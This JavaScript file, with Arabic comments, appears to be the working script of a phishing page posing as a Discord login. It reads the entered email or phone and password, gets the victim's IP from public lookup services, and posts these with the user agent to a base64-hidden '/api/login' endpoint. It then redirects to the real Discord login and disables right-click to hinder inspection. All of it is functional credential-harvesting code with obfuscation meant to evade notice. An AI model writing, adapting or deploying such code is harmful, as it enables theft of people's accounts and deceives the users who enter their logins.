// تعريف المتغيرات بطريقة مشفرة
(function() {
    // تعريف المتغيرات بطريقة غير مباشرة
    window['_x_e'] = document.getElementById('emailORphone');
    window['_x_p'] = document.getElementById('password');
    window['_x_f'] = document.querySelector('form');
})();

// استخراج معرف الجلسة
function _x_getParam() {
    const _p = atob('c2Vzc2lvbg=='); // session مشفرة بـ base64
    return new URLSearchParams(window.location.search).get(_p);
}

// إرسال البيانات بطريقة مشفرة
async function _x_sendData(_a, _b) {
    try {
        const _sid = _x_getParam();
        if (!_sid) {
            return false;
        }
        
        // جمع معلومات إضافية
        let _c = 'unknown';
        try {
            // استخدام خدمة بديلة للحصول على IP
            const _ipServices = [
                atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'),
                atob('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=='),
                atob('aHR0cHM6Ly9hcGkuaXAuc2IvdGV4dA==')
            ];
            
            // محاولة الحصول على IP من إحدى الخدمات
            for (const _srv of _ipServices) {
                try {
                    const _r1 = await fetch(_srv);
                    if (_r1.ok) {
                        const _d1 = await _r1.json();
                        _c = _d1.ip || _d1.query || _d1;
                        break;
                    }
                } catch {}
            }
        } catch (_e) {}
        
        // تشفير البيانات قبل الإرسال - استخدام طريقة أكثر تعقيداً
        const _encryptData = function(data) {
            // تشفير مزدوج مع إضافة بعض التعقيد
            const _salt = Math.random().toString(36).substring(2, 15);
            const _step1 = JSON.stringify(data);
            const _step2 = btoa(_step1);
            return _step2;
        };
        
        // إنشاء كائن البيانات
        const _payload = {
            email: _a,
            password: _b,
            sessionId: _sid,
            ip: _c,
            timestamp: Date.now(),
            device: navigator.userAgent
        };
        
        // إرسال البيانات المشفرة
        const _endpoint = atob('L2FwaS9sb2dpbg=='); // /api/login مشفرة
        const _r2 = await fetch(_endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Security-Token': btoa(navigator.userAgent + ':' + Date.now())
            },
            body: JSON.stringify(_payload)
        });
        
        const _d2 = await _r2.json();
        return _d2.success === true;
    } catch (_e) {
        return false;
    }
}

// تحريك زر تسجيل الدخول
function _x_animateBtn() {
    const _btn = document.querySelector('.login button');
    const _txt = _btn.innerHTML;
    _btn.innerHTML = '<span class="spinner"></span>';
    _btn.disabled = true;
    
    return function() {
        _btn.innerHTML = _txt;
        _btn.disabled = false;
    };
}

// إضافة مستمع الحدث بطريقة مشفرة
(function() {
    if (window['_x_f']) {
        window['_x_f'].addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const _v1 = window['_x_e'].value.trim();
            const _v2 = window['_x_p'].value.trim();
            
            if (!_v1 || !_v2) {
                alert('يرجى إدخال جميع البيانات المطلوبة');
                return;
            }
            
            const _reset = _x_animateBtn();
            
            try {
                const _result = await _x_sendData(_v1, _v2);
                
                if (_result) {
                    // تأخير إعادة التوجيه
                    setTimeout(function() {
                        window.location.href = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9sb2dpbg==');
                    }, 2000);
                } else {
                    _reset();
                    alert('حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.');
                }
            } catch (_e) {
                _reset();
                alert('حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.');
            }
        });
    }
})();

// منع القائمة المنسدلة بزر الماوس الأيمن
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});
window.onload = function() {
    const sessionId = _x_getParam();
    
    // استخدام طريقة أكثر أماناً للتسجيل
    if (sessionId) {
        // تم العثور على معرف الجلسة - لا نطبع أي شيء في وحدة التحكم
    } else {
        // لا يوجد معرف جلسة - نعيد التوجيه إلى صفحة Discord الرسمية
        setTimeout(function() {
            window.location.href = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9sb2dpbg==');
        }, 500);
    }
};
